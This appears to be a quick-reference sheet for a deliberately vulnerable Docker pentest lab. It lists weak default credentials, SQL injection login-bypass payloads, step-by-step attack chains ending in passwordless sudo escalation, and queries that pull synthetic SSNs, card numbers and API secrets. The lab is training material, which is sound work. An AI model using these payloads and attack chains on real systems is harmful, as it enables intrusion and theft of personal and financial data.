# Quick Reference - Lab Credentials & Access

## 🔐 Service Credentials

### MySQL Database (Port 3306)
- **Root**: `root` / `root`
- **Admin**: `admin` / `admin123`
- **Database**: `company_db`

### FTP Server (Port 21)
- **Anonymous**: `anonymous` / (empty)
- **User**: `ftpuser` / `password123`

### SMB/Samba (Port 445)
- **User**: `smbuser` / `smbuser`

### SSH Server (Port 22)
- **Root**: `root` / `root123`
- **Admin**: `admin` / `admin123` (passwordless sudo!)
- **User**: `user` / `password`
- **Guest**: `guest` / `guest`

---

## 🌐 Web Access

### URLs
- **Home**: http://localhost:8080/
- **Login**: http://localhost:8080/login.html
- **Admin**: http://localhost:8080/admin.html
- **Database**: http://localhost:8080/database.html

### SQL Injection Payloads
```
Username: admin' OR '1'='1
Password: anything

# Alternative payloads:
' OR 1=1--
admin'--
' UNION SELECT NULL,NULL--
```

---

## 💾 Database Tables & Content

### Quick Queries
```sql
-- View all employees
SELECT * FROM employees;

-- Get sensitive employee data (>$80K)
SELECT first_name, last_name, ssn, salary 
FROM employees WHERE salary > 80000;

-- Get all customer credit cards
SELECT full_name, credit_card, cvv, expiry 
FROM customers WHERE account_status='active';

-- Get plaintext system passwords
SELECT system_name, username, password, access_level 
FROM system_credentials;

-- Get API keys and secrets
SELECT secret_type, secret_name, secret_value 
FROM company_secrets 
WHERE classification IN ('TOP_SECRET', 'CONFIDENTIAL');
```

---

## 📁 File Server Files

Located in: `file-server/shared-files/`

1. **Q4_Financial_Report.txt** - DB: admin/admin123, AWS keys
2. **production_config.ini** - All passwords, API keys, JWT secrets
3. **employee_directory.txt** - SSNs, VPN: jsmith/JS_vpn2024!
4. **backup_script.sh** - DB: root/root, AWS S3 keys
5. **database_backup.sql.old** - Customer data, admin password
6. **flag.txt** - FLAG{SMB_FTP_ACCESS_GRANTED_SECRET_DATA_FOUND}

### FTP Access
```bash
ftp localhost 21
Name: anonymous
Password: (press Enter)
ftp> ls
ftp> get production_config.ini
ftp> get Q4_Financial_Report.txt
```

---

## 🎯 Attack Scenarios

### Scenario 1: Web → Database
```bash
# 1. SQL injection on login
# 2. Access admin panel
# 3. Find DB credentials: admin/admin123
# 4. Connect to database
docker exec -it pentest-kali mysql -h 172.22.0.3 -u admin -padmin123 company_db
# 5. Exfiltrate data
SELECT * FROM customers;
```

### Scenario 2: FTP → Credentials → SSH
```bash
# 1. Anonymous FTP
ftp localhost 21
# 2. Download employee_directory.txt
# 3. Find SSH creds: admin/admin123
# 4. SSH access
ssh admin@localhost -p 22
# 5. Privilege escalation
sudo su  # No password required!
```

### Scenario 3: Database → File Server → Cloud
```bash
# 1. Database access
# 2. Get system_credentials table
# 3. Find file server creds
# 4. Access file server
# 5. Get AWS keys from config files
# 6. Compromise cloud infrastructure
```

---

## 🔬 Container IPs (may vary)

- **Kali**: 172.20.0.2 (attacker-net)
- **Web**: 172.21.0.2 (dmz-net)
- **Database**: 172.22.0.3 (internal-net)
- **File Server**: 172.22.0.4 (internal-net)
- **Linux**: 172.22.0.5 (internal-net)

### Get Current IPs
```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pentest-web
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pentest-db
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pentest-fileserver
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pentest-vuln-linux
```

---

## 📊 Data Summary

| Asset | Count | Type |
|-------|-------|------|
| Employee Records | 20 | SSN, Salary, Email |
| Customer Records | 10 | Credit Card, CVV |
| System Credentials | 16 | Plaintext Passwords |
| API Keys/Secrets | 14 | AWS, Stripe, SendGrid |
| Sensitive Files | 6 | Config, Scripts, Reports |
| Web Pages | 4 | Vulnerable HTML |
| Containers | 7 | Docker Services |

---

## 🛠️ Useful Commands

### Start/Stop
```bash
docker-compose up -d                    # Start all services
docker-compose ps                       # Check status
docker-compose logs -f                  # View logs
docker-compose down                     # Stop all services
```

### Database
```bash
# Connect to database
docker exec -it pentest-db mysql -uadmin -padmin123 company_db

# Load initial data
cat db-init/init.sql | docker exec -i pentest-db mysql -uroot -proot company_db

# Quick query
docker exec pentest-db mysql -uadmin -padmin123 company_db -e "SELECT COUNT(*) FROM employees;"
```

### Testing
```bash
# Test everything
./scripts/demo-lab.sh

# Generate HTML report
./scripts/internal-pentest-report.sh

# View report
open reports/internal_lab_report_*.html
```

### Kali Access
```bash
# Enter Kali container
docker exec -it pentest-kali /bin/bash

# From Kali, scan internal network
nmap -sV 172.22.0.0/24
```

---

## 🎁 Bonus: Sample Data

### Employee
- Name: John Smith
- Email: john.smith@company.com
- SSN: 123-45-6789
- Salary: $85,000
- Password Hash: e10adc3949ba59abbe56e057f20f883e (MD5: 123456)

### Customer
- Name: Alice Cooper
- Email: alice.cooper@email.com
- Card: 4532-1234-5678-9010
- CVV: 123
- Expiry: 2025-12-31

### System Credential
- System: Production Database
- Username: db_admin
- Password: DbP@ssw0rd2024
- Access Level: admin

### API Key
- Service: AWS Console
- Access Key: AKIAIOSFODNN7EXAMPLE
- Secret Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
- Classification: TOP_SECRET

---

**Last Updated**: February 10, 2026
**Status**: ✅ Fully Functional with Real Data
